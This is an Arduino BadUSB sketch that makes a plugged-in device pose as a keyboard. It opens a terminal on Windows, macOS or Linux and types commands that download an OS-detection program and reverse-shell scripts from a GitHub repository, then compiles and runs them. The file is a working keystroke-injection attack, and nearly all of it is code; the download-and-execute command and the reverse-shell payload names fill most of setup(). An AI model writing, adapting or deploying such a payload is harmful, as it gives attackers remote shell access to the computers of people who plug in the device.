#include "Keyboard.h"

// Define the payload name, IP, and PORT at the beginning
const char* detectType = "COSDetect.cpp"; // through C++, python, or bash?
const char* folder = "COSD";

// different payloads:
const char* payload1 = "winRevShell.sh"; 
const char* payload2 = "macRevShell.sh";
const char* payload3 = "linuxRevShell.sh";

void enter() { //quick function cause brainrot
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}


const int d = 500;
void setup() {
  // Begin the Keyboard
  Keyboard.begin();

  // Wait for a moment
  delay(1000);

  // terminal
  Keyboard.press(KEY_LEFT_GUI); // CMD + space for mac launcher, doesnt affect windows or linux
  Keyboard.press(' ');
  Keyboard.releaseAll(); // note: i would have the windows launcher go first as its slower, 
  //                              but on some linux distros (popOS in my case), opening the launcher and
  //.                             pressing super + space opens the browser, so thats why its in this order

  Keyboard.press(KEY_LEFT_GUI); // open windows/linux launcher, doesnt affect mac
  Keyboard.release(KEY_LEFT_GUI);
  delay(d + 250);

  Keyboard.print("terminal");
  delay(d + d);
  enter();

  // download OS detection + payloads
  delay(1000);
  Keyboard.print("mkdir -p ");
  Keyboard.print(folder);
  Keyboard.print(" && cd ");
  Keyboard.print(folder);
  Keyboard.print(" && curl -O https://raw.githubusercontent.com/SkepticSeptic/badUSB-OS-detection/main/COSDetect.cpp && curl -O https://raw.githubusercontent.com/SkepticSeptic/badUSB-OS-detection/main/macRevShell.sh && curl -O https://raw.githubusercontent.com/SkepticSeptic/badUSB-OS-detection/main/linuxRevShell.sh && curl -O https://raw.githubusercontent.com/SkepticSeptic/badUSB-OS-detection/main/winRevShell.ps1");
  enter();
  delay(d * 3);

  // compile all of them and run
  Keyboard.print("g++ COSDetect.cpp -o COSDC && chmod +x macRevShell.sh && chmod +x linuxRevShell.sh");
  enter();
  delay(d + 250);
  Keyboard.print("./COSDC");
  enter();

  




  










  // End the Keyboard
  Keyboard.end();
}

void loop() {
  // Nothing to do here
}
